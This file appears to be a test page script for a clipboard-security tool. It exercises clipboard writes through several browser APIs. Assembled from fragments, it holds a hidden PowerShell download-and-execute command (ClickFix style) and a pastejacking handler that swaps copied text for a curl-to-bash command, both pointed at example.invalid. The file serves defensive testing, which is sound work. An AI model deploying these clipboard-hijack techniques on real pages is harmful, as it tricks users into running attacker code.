// Test page script (served as /<csp>/page.js; nonce'd on the strict-CSP variant).
// Malicious samples are assembled from fragments at runtime (CLAUDE.md test-data rules) and are
// harmless anyway: they point at example.invalid and are never executed.
(() => {
  const clickfix = () =>
    ['power', 'shell -w hidden -c "i', 'ex(i', "wr 'https://example.invalid/a.ps1')\""].join('');
  const log = (msg) => {
    const out = document.getElementById('log');
    if (out) out.textContent += `${msg}\n`;
  };
  const on = (id, fn) => {
    const el = document.getElementById(id);
    if (el) el.addEventListener('click', fn);
  };

  // 1. Async Clipboard API.
  on('write-clickfix', () =>
    navigator.clipboard.writeText(clickfix()).then(
      () => log('writeText resolved'),
      (e) => log(`writeText rejected: ${e.name}`),
    ),
  );
  on('write-benign', () =>
    navigator.clipboard.writeText('npm install left-pad').then(
      () => log('benign resolved'),
      (e) => log(`benign rejected: ${e.name}`),
    ),
  );
  on('write-item', () => {
    const blob = new Blob([clickfix()], { type: 'text/plain' });
    navigator.clipboard.write([new ClipboardItem({ 'text/plain': blob })]).then(
      () => log('write resolved'),
      (e) => log(`write rejected: ${e.name}`),
    );
  });
  on('write-id', () =>
    // A made-up Taiwanese national ID with a valid checksum (the classic test value).
    navigator.clipboard.writeText(`我的身分證 ${['A12', '3456', '789'].join('')}`).then(
      () => log('id resolved'),
      (e) => log(`id rejected: ${e.name}`),
    ),
  );

  // 2a. Hidden textarea + execCommand('copy') (no copy handler: the selection is copied).
  on('exec-copy', () => {
    const ta = document.createElement('textarea');
    ta.value = clickfix();
    ta.style.position = 'fixed';
    ta.style.left = '-9999px';
    document.body.append(ta);
    ta.select();
    log(`execCommand: ${document.execCommand('copy')}`);
    ta.remove();
  });

  // 2b. execCommand('copy') with a copy handler that rewrites clipboardData.
  on('copy-event', () => {
    const handler = (e) => {
      e.clipboardData.setData('text/plain', clickfix());
      e.preventDefault();
      document.removeEventListener('copy', handler);
    };
    document.addEventListener('copy', handler);
    log(`execCommand: ${document.execCommand('copy')}`);
  });

  // Pastejacking: the user copies the visible text, the page swaps in a command.
  document.addEventListener('copy', (e) => {
    const sel = String(document.getSelection());
    if (!sel.includes('pastejack me')) return;
    e.clipboardData.setData(
      'text/plain',
      ['cu', 'rl -s https://example.invalid/p | ', 'ba', 'sh'].join(''),
    );
    e.preventDefault();
  });

  window.__pwPageReady = true;
})();
